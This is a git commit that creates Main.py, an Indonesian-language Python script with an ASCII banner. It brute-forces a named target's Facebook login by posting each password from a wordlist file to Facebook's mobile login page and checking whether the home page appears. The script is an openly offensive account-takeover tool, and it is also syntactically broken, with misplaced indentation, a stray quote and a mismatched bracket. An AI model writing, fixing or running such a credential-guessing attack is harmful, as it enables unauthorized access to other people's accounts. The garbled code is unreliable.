c6396cd0a2ffd24f8a7f1504ffd956be48f38743
Wekai <47638706+Wekai@users.noreply.github.com>
2019-03-23 13:29:22 +0700

    Create Main.py

---
+++ Main.py
@@ -0,0 +1,31 @@
+import requests
+import sys
+ print "  ▄▄▄  ▄▄▄      ▄▄▄             ▄▄ "
+ print "  ███  ███     ▄███             ██ "
+  print " ████████    █▀ ██   ██    ██  ██ "
+  print " ██ ██ ██  ▄█▀  ██   ██    ██  ██ "
+  print " ██ ▀▀ ██  ████████  ██    ██  ██ "
+  print " ██    ██       ██   ██▄▄▄███  ██▄▄▄▄▄▄ "
+ print "  ▀▀    ▀▀       ▀▀    ▀▀▀▀ ▀▀  ▀▀▀▀▀▀▀▀ "
+
+
+
+
+
+
+
+
+
+
+email = raw_input(" Masukan Username Target :")
+url='https://free.facebook.com/login.php'
+ex = open('word.txt','r').readlines()
+for line in ex:
+password=line.strip()"
+http = requests.post(url, data=('email':email, 'pass':password, 'login':'sumbit'})
+content = http.content
+if "Beranda" in content:
+print "[-] Password Ditemukan",password
+sys.exit(1)
+else:
+print "[-] Password Salah Ntod :v",password
